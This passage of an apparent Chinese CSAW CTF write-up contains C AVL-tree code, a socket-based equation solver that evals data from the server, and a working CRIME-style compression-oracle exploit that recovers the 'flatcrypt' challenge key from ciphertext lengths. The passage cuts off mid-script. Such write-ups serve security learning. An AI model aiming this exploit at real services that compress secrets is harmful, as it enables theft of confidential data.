FALSE;</span><br><span class="line">          &#125;</span><br><span class="line">         <span class="hljs-keyword">if</span>(e&lt;(*t)-&gt;key)</span><br><span class="line">          &#123;</span><br><span class="line">               <span class="hljs-keyword">if</span>(FALSE == InsertAVL(&amp;((*t)-&gt;lchild),e,taller))</span><br><span class="line">                <span class="hljs-keyword">return</span> FALSE;</span><br><span class="line">               <span class="hljs-keyword">if</span>(*taller)</span><br><span class="line">               &#123;</span><br><span class="line">                <span class="hljs-keyword">switch</span>((*t)-&gt;bf)</span><br><span class="line">                &#123;</span><br><span class="line">                     <span class="hljs-keyword">case</span> LH:</span><br><span class="line">                          LeftBalance(t);</span><br><span class="line">                          *taller=FALSE;</span><br><span class="line">                          <span class="hljs-keyword">break</span>;</span><br><span class="line">                     <span class="hljs-keyword">case</span> EH:</span><br><span class="line">                          (*t)-&gt;bf=LH;</span><br><span class="line">                          *taller=TRUE;</span><br><span class="line">                          <span class="hljs-keyword">break</span>;</span><br><span class="line">                     <span class="hljs-keyword">case</span> RH:</span><br><span class="line">                          (*t)-&gt;bf=EH;</span><br><span class="line">                          *taller=FALSE;</span><br><span class="line">                          <span class="hljs-keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="hljs-keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">               <span class="hljs-keyword">if</span>(FALSE == InsertAVL(&amp;((*t)-&gt;rchild),e,taller))</span><br><span class="line">                <span class="hljs-keyword">return</span> FALSE;</span><br><span class="line">               <span class="hljs-keyword">if</span>(*taller)</span><br><span class="line">               &#123;</span><br><span class="line">                <span class="hljs-keyword">switch</span>((*t)-&gt;bf)</span><br><span class="line">                &#123;</span><br><span class="line">                     <span class="hljs-keyword">case</span> RH:</span><br><span class="line">                          RightBalance(t);</span><br><span class="line">                          *taller=FALSE;</span><br><span class="line">                          <span class="hljs-keyword">break</span>;</span><br><span class="line">                     <span class="hljs-keyword">case</span> EH:</span><br><span class="line">                          (*t)-&gt;bf=RH;</span><br><span class="line">                          *taller=TRUE;</span><br><span class="line">                          <span class="hljs-keyword">break</span>;</span><br><span class="line">                     <span class="hljs-keyword">case</span> LH:</span><br><span class="line">                          (*t)-&gt;bf=EH;</span><br><span class="line">                          *taller=FALSE;</span><br><span class="line">                          <span class="hljs-keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="hljs-keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">(BSTree *t)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">     <span class="hljs-keyword">if</span>(<span class="hljs-literal">NULL</span> != *t)</span><br><span class="line">     &#123;</span><br><span class="line">          destroy(&amp;((*t)-&gt;lchild));</span><br><span class="line">          destroy(&amp;((*t)-&gt;rchild));</span><br><span class="line">          <span class="hljs-built_in">free</span>(*t);</span><br><span class="line">          *t = <span class="hljs-literal">NULL</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="hljs-keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">destroyAVL</span><span class="hljs-params">(BSTree root)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">     <span class="hljs-keyword">if</span>(<span class="hljs-literal">NULL</span> != root)</span><br><span class="line">     &#123;</span><br><span class="line">          destroy(&amp;root);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="hljs-keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">     BSTree root=<span class="hljs-literal">NULL</span>,r;</span><br><span class="line">     <span class="hljs-keyword">bool_t</span> taller=FALSE;</span><br><span class="line">     <span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[]=&#123;<span class="hljs-number">16</span>,<span class="hljs-number">67</span>,<span class="hljs-number">87</span>,<span class="hljs-number">73</span>,<span class="hljs-number">81</span>,<span class="hljs-number">71</span>,<span class="hljs-number">11</span>,<span class="hljs-number">38</span>,<span class="hljs-number">49</span>,<span class="hljs-number">59</span>,<span class="hljs-number">30</span>,<span class="hljs-number">85</span>,<span class="hljs-number">73</span>,<span class="hljs-number">26</span>,<span class="hljs-number">58</span>,<span class="hljs-number">35</span>,<span class="hljs-number">50</span>,<span class="hljs-number">72</span>,<span class="hljs-number">70</span>,<span class="hljs-number">50</span>,<span class="hljs-number">76</span>,<span class="hljs-number">17</span>,<span class="hljs-number">94</span>,<span class="hljs-number">8</span>,<span class="hljs-number">58</span>,<span class="hljs-number">55</span>,<span class="hljs-number">68</span>,<span class="hljs-number">88</span>,<span class="hljs-number">15</span>,<span class="hljs-number">37</span>,<span class="hljs-number">75</span>,<span class="hljs-number">27</span>,<span class="hljs-number">75</span>,<span class="hljs-number">30</span>,<span class="hljs-number">1</span>,<span class="hljs-number">85</span>,<span class="hljs-number">94</span>,<span class="hljs-number">27</span>,<span class="hljs-number">7</span>,<span class="hljs-number">71</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">70</span>,<span class="hljs-number">4</span>,<span class="hljs-number">17</span>,<span class="hljs-number">21</span>,<span class="hljs-number">38</span>,<span class="hljs-number">29</span>,<span class="hljs-number">2</span>,<span class="hljs-number">71</span>,<span class="hljs-number">85</span>,<span class="hljs-number">5</span>,<span class="hljs-number">59</span>,<span class="hljs-number">67</span>,<span class="hljs-number">83</span>,<span class="hljs-number">93</span>,<span class="hljs-number">47</span>,<span class="hljs-number">5</span>,<span class="hljs-number">81</span>,<span class="hljs-number">29</span>,<span class="hljs-number">64</span>,<span class="hljs-number">36</span>,<span class="hljs-number">15</span>,<span class="hljs-number">89</span>,<span class="hljs-number">45</span>,<span class="hljs-number">90</span>,<span class="hljs-number">40</span>,<span class="hljs-number">21</span>,<span class="hljs-number">53</span>,<span class="hljs-number">51</span>,<span class="hljs-number">35</span>,<span class="hljs-number">57</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">48</span>,<span class="hljs-number">23</span>,<span class="hljs-number">44</span>,<span class="hljs-number">66</span>,<span class="hljs-number">71</span>,<span class="hljs-number">81</span>,<span class="hljs-number">95</span>,<span class="hljs-number">73</span>,<span class="hljs-number">17</span>,<span class="hljs-number">42</span>,<span class="hljs-number">1</span>,<span class="hljs-number">98</span>,<span class="hljs-number">19</span>,<span class="hljs-number">34</span>,<span class="hljs-number">6</span>,<span class="hljs-number">87</span>,<span class="hljs-number">68</span>,<span class="hljs-number">21</span>,<span class="hljs-number">78</span>,<span class="hljs-number">88</span>,<span class="hljs-number">78</span>,<span class="hljs-number">17</span>,<span class="hljs-number">97</span>,<span class="hljs-number">49</span>,<span class="hljs-number">90</span>,<span class="hljs-number">5</span>&#125;;</span><br><span class="line">     <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;</span><br><span class="line">     <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)</span><br><span class="line">          InsertAVL(&amp;root,<span class="hljs-built_in">array</span>[i],&amp;taller);</span><br><span class="line">     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"中序遍历:\n"</span>);</span><br><span class="line">     InOrderTraverse(root);</span><br><span class="line">     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n先序遍历\n"</span>);</span><br><span class="line">     PreOrderTraverse(root);</span><br><span class="line"> </span><br><span class="line">     destroyAVL(root);</span><br><span class="line">     root = <span class="hljs-literal">NULL</span>;</span><br><span class="line">     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Are you a real math wiz?</span><br><span class="line"></span><br><span class="line">nc misc.chal.csaw.io 9002</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;nc上去发现是解一元方程。</p><p><div align="center"><br>    <img src="/images/posts/csaw/1.png"><br></div><br>&emsp;&emsp;写一个求解器：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">sc = socket.socket()  <span class="hljs-comment"># 创建 socket 对象</span></span><br><span class="line">host = <span class="hljs-string">"misc.chal.csaw.io"</span>  <span class="hljs-comment"># 获取本地主机名</span></span><br><span class="line">port = <span class="hljs-number">9002</span>  <span class="hljs-comment"># 设置端口</span></span><br><span class="line">addr = (host, port)</span><br><span class="line">sc.connect(addr)  <span class="hljs-comment"># 绑定端口号</span></span><br><span class="line"><span class="hljs-keyword">print</span> sc.recv(<span class="hljs-number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve1</span><span class="hljs-params">(eq,var=<span class="hljs-string">'X'</span>)</span>:</span></span><br><span class="line">    eq1 = eq.replace(<span class="hljs-string">"="</span>,<span class="hljs-string">"-("</span>) + <span class="hljs-string">")"</span></span><br><span class="line">    c = eval(eq1,&#123;var:<span class="hljs-number">1j</span>&#125;)</span><br><span class="line">    <span class="hljs-keyword">if</span> (-c.real == <span class="hljs-number">0</span>):</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> -c.real/c.imag</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    data = sc.recv(<span class="hljs-number">1024</span>)</span><br><span class="line">    <span class="hljs-keyword">print</span> data</span><br><span class="line">    equation = data.split(<span class="hljs-string">'\n'</span>)[<span class="hljs-number">0</span>]</span><br><span class="line">    result = str(solve1(equation))</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">'正在求解：'</span> + equation + <span class="hljs-string">', result = '</span> + result</span><br><span class="line">    sc.send(result + <span class="hljs-string">'\n'</span>)</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">'==========================='</span></span><br><span class="line"></span><br><span class="line">find()</span><br><span class="line"></span><br><span class="line">i = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">'============ 第 '</span> + str(i + <span class="hljs-number">1</span>) + <span class="hljs-string">' 轮 ==============='</span></span><br><span class="line">    data = sc.recv(<span class="hljs-number">2048</span>)</span><br><span class="line">    <span class="hljs-keyword">print</span> data</span><br><span class="line">    equation = data.split(<span class="hljs-string">'\n'</span>)[<span class="hljs-number">1</span>]</span><br><span class="line">    result = str(solve1(equation))</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">'正在求解：'</span> + equation + <span class="hljs-string">', result = '</span> + result</span><br><span class="line">    sc.send(result + <span class="hljs-string">'\n'</span>)</span><br><span class="line">    i += <span class="hljs-number">1</span></span><br></pre></td></tr></table></figure></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="flatcrypt"><a href="#flatcrypt" class="headerlink" title="flatcrypt"></a>flatcrypt</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">no logos or branding for this bug</span><br><span class="line"></span><br><span class="line">Take your pick nc crypto.chal.csaw.io 8040 nc crypto.chal.csaw.io 8041 nc crypto.chal.csaw.io 8042 nc crypto.chal.csaw.io 8043</span><br><span class="line"></span><br><span class="line">flag is not in flag format. flag is PROBLEM_KEY</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;答题附件：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> zlib</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</span><br><span class="line"><span class="hljs-keyword">from</span> Crypto.Util <span class="hljs-keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">ENCRYPT_KEY = bytes.fromhex(<span class="hljs-string">'0000000000000000000000000000000000000000000000000000000000000000'</span>)</span><br><span class="line"><span class="hljs-comment"># Determine this key.</span></span><br><span class="line"><span class="hljs-comment"># Character set: lowercase letters and underscore</span></span><br><span class="line">PROBLEM_KEY = <span class="hljs-string">'not_flag'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(data, ctr)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> AES.new(ENCRYPT_KEY, AES.MODE_CTR, counter=ctr).encrypt(zlib.compress(data))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    f = input(<span class="hljs-string">"Encrypting service\n"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> len(f) &lt; <span class="hljs-number">20</span>:</span><br><span class="line">        <span class="hljs-keyword">continue</span></span><br><span class="line">    enc = encrypt(bytes((PROBLEM_KEY + f).encode(<span class="hljs-string">'utf-8'</span>)), Counter.new(<span class="hljs-number">64</span>, prefix=os.urandom(<span class="hljs-number">8</span>)))</span><br><span class="line">    print(<span class="hljs-string">"%s%s"</span> %(enc, chr(len(enc))))</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这道题网上搜了一下发现有类似的题目。</p><p>&emsp;&emsp;&emsp;&emsp;<a href="http://www.blue-lotus.net/plaidctf-2013-crypto-compression250-writeup/" target="_blank" rel="noopener">http://www.blue-lotus.net/plaidctf-2013-crypto-compression250-writeup/</a></p><p>&emsp;&emsp;&emsp;&emsp;<a href="https://systemoverlord.com/2013/04/30/plaidctf-compression/" target="_blank" rel="noopener">https://systemoverlord.com/2013/04/30/plaidctf-compression/</a></p><p>&emsp;&emsp;&emsp;&emsp;<a href="https://www.cnblogs.com/shuidao/p/3151067.html" target="_blank" rel="noopener">https://www.cnblogs.com/shuidao/p/3151067.html</a></p><p>&emsp;&emsp;解题的关键是利用<code>zlib.compress()</code>压缩数据时造成的漏洞，当压缩的字符串中有<code>3个以上</code>重复的字符串时，<code>LZ77</code>压缩算法就会对字符串进行压缩。如：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vvvvv</span><br><span class="line">Blah blah blah blah blah!</span><br><span class="line">^^^^^</span><br><span class="line">接下来的5个字符正好和已经在数据流中的字符串相等, 而且刚好在当前数据点的前5个字符开始. 在这个case中,我们可以在数据流中输出特殊的字符, 一个长度数字 和一个距离数字.</span><br><span class="line"></span><br><span class="line">目前数据是:</span><br><span class="line">Blah blah b</span><br><span class="line"></span><br><span class="line">压缩后的格式是:</span><br><span class="line">Blah b[D=5,L=5]</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;再加上AES使用CTR流密码模式，那么待加密字符的长度不一样就会产生<code>不一样长度</code>的密文。这个可以用下面这个脚本体验一下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> zlib</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">import</span> string</span><br><span class="line"><span class="hljs-keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</span><br><span class="line"><span class="hljs-keyword">from</span> Crypto.Util <span class="hljs-keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">ENCRYPT_KEY = bytes.fromhex(<span class="hljs-string">'0000000000000000000000000000000000000000000000000000000000000000'</span>)</span><br><span class="line"><span class="hljs-comment"># Determine this key.</span></span><br><span class="line"><span class="hljs-comment"># Character set: lowercase letters and underscore</span></span><br><span class="line">PROBLEM_KEY = <span class="hljs-string">'crime_doesnt_have_a_logo'</span></span><br><span class="line">padding = <span class="hljs-string">'A'</span> * <span class="hljs-number">20</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(data, ctr)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> AES.new(ENCRYPT_KEY, AES.MODE_CTR, counter=ctr).encrypt(zlib.compress(data))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>):</span><br><span class="line">    f = padding + <span class="hljs-string">''</span>.join(random.sample(string.ascii_letters + string.digits, <span class="hljs-number">4</span>))</span><br><span class="line">    <span class="hljs-comment"># if len(f) &lt; 20:</span></span><br><span class="line">    <span class="hljs-comment">#     continue</span></span><br><span class="line">    enc = encrypt(bytes((PROBLEM_KEY + f).encode(<span class="hljs-string">'utf-8'</span>)), Counter.new(<span class="hljs-number">64</span>, prefix=os.urandom(<span class="hljs-number">8</span>)))</span><br><span class="line">    print(<span class="hljs-string">"%s --&gt; %s"</span> %(f, len(enc)))</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'---------finally----------'</span>)</span><br><span class="line">enc = encrypt(bytes((PROBLEM_KEY + padding + <span class="hljs-string">'crime'</span>).encode(<span class="hljs-string">'utf-8'</span>)), Counter.new(<span class="hljs-number">64</span>, prefix=os.urandom(<span class="hljs-number">8</span>)))</span><br><span class="line">print(<span class="hljs-string">"%s --&gt; %s"</span> %(<span class="hljs-string">'crime'</span>, len(enc)))</span><br></pre></td></tr></table></figure></p><p><div align="center"><br>    <img src="/images/posts/csaw/6.png"><br></div><br>&emsp;&emsp;所以可以看出当我们能得到一个三个字符都一样的字符串时我们得到的长度就会<code>变小</code>（压缩），然后根据这三个字符不断的<code>往前猜和往后猜</code>就能找到所有的字符。</p><p>&emsp;&emsp;最终exp：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> socket</span><br><span class="line"><span class="hljs-keyword">import</span> random, string</span><br><span class="line"></span><br><span class="line">sc = socket.socket()  <span class="hljs-comment"># 创建 socket 对象</span></span><br><span class="line">host = <span class="hljs-string">"crypto.chal.csaw.io"</span>  <span class="hljs-comment"># 获取本地主机名</span></span><br><span class="line">port = <span class="hljs-number">8040</span>  <span class="hljs-comment"># 设置端口</span></span><br><span class="line">addr = (host, port)</span><br><span class="line">sc.connect(addr)  <span class="hljs-comment"># 绑定端口号</span></span><br><span class="line"></span><br><span class="line">strs = <span class="hljs-string">'abcdefghijklmnopqrstuvwxyz_'</span></span><br><span class="line">size = <span class="hljs-number">20</span></span><br><span class="line"><span class="hljs-keyword">print</span> sc.recv(<span class="hljs-number">1024</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"></span><br><span class="line">padding = <span class="hljs-string">''</span>.join(random.sample(string.ascii_uppercase + string.digits + string.ascii_letters, size))</span><br><span class="line"><span class="hljs-keyword">print</span> <span class="hljs-string">'[!] padding: '</span> + padding</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_fore</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    last_len = <span class="hljs-number">0</span></span><br><span class="line">    last_tmp = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> f1 <span class="hljs-keyword">in</span> strs:</span><br><span class="line">        <span class="hljs-keyword">for</span> f2 <span class="hljs-keyword">in</span> strs:</span><br><span class="line">            <span class="hljs-keyword">for</span> f3 <span class="hljs-keyword">in</span> strs:</span><br><span class="line">                <span class="hljs-keyword">for</span> f4 <span class="hljs-keyword">in</span> strs:</span><br><span class="line">                    tmp = f1 + f2 + f3 + f4</span><br><span class="line">                    <span class="hljs-keyword">if</span> tmp == <span class="hljs-string">'aaaa'</span>:</span><br><span class="line">                        <span class="hljs-keyword">continue</span></span><br><span class="line">                    data = padding + tmp</span><br><span class="line">                    sc.send(data + <span class="hljs-string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">                    temp = sc.recv(<span class="hljs-number">1024</span>).split(<span class="hljs-string">'\n'</span>)[<span class="hljs-number">0</span>]</span><br><span class="line">                    <span class="hljs-comment"># print '[+] recv data: ' + temp</span></span><br><span class="line">                    <span class="hljs-keyword">try</span>:</span><br><span class="line">                        len = ord(temp[<span class="hljs-number">-1</span>:])</span><br><span class="line">                    <span class="hljs-keyword">except</span>:</span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">'[ERROR] error...'</span></span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">'[!] padding: '</span> + padding</span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">'[!] recv data: '</span> + temp</span><br><span class="line">                        <span class="hljs-keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="hljs-keyword">if</span> last_len != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> last_len != len <span class="hljs-keyword">and</span> tmp <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> padding <span class="hljs-keyword">and</span> last_tmp <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> padding:</span><br><span class="line">                        <span class="hljs-comment"># 找到一个</span></span><br><span class="line">                        <span class="hljs-keyword">if</span> last_len &gt; len:</span><br><span class="line">                            flag = tmp</span><br><span class="line">                        <span class="hljs-keyword">else</span>:</span><br><span class="line">                            flag = last_tmp</span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">'[*] some flag: '</span> + flag</span><br><span class="line">                        sc.close()</span><br><span class="line">                        exit(<span class="hljs-number">0</span>)</span><br><span class="line"></span><br><span class="line">                    last_len = len</span><br><span class="line">                    <span class="hljs-keyword">print</span> <span class="hljs-string">'%s --&gt; %s'</span> % (tmp, str(len))</span><br><span class="line">                    last_tmp = tmp</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_more</span><span class="hljs-params">(target)</span>:</span></span><br><span class="line">    i = <span class="hljs-number">1</span></span><br><span class="line">    over = <span class="hljs-keyword">False</span></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> over:</span><br><span class="line">        last_len = <span class="hljs-number">0</span></span><br><span class="line">        last_tmp = <span class="hljs-string">''</span></span><br><span class="line">        <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> strs:</span><br><span class="line">            <span class="hljs-comment"># data = padding + target[i:] + f  # 向后</span></span><br><span class="line">            data = padding + f + target[:len(target) - i]    <span class="hljs-comment"># 向前</span></span><br><span class="line">            sc.send(data + <span class="hljs-string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">            temp = sc.recv(<span class="hljs-number">1024</span>).split(<span class="hljs-string">'\n'</span>)[<span class="hljs-number">0</span>]</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">'[+] recv data: '</span> + temp</span><br><span class="line">            lens = ord(temp[<span class="hljs-number">-1</span>:])</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">'sended: %s --&gt; %s'</span> % (data, str(lens))</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> last_len != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> last_len != lens:</span><br><span class="line">                <span class="hljs-comment"># 找到一个</span></span><br><span class="line">                <span class="hljs-keyword">if</span> last_len &gt; lens:</span><br><span class="line">                    <span class="hljs-comment"># target += f   # 向后</span></span><br><span class="line">                    target = f + target</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    <span class="hljs-comment"># target += last_tmp    # 向后</span></span><br><span class="line">                    target = last_tmp + target</span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">'[*] target: '</span> + target</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">            last_len = lens</span><br><span class="line">            last_tmp = f</span><br><span class="line">            <span class="hljs-keyword">if</span> f == <span class="hljs-string">'_'</span>:</span><br><span class="line">                over = <span class="hljs-keyword">True</span></span><br><span class="line">                <span class="hljs-keyword">print</span> <span class="hljs-string">'[!] OVER!'</span></span><br><span class="line"></span><br><span class="line">        i += <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line">get_fore()  <span class="hljs-comment"># 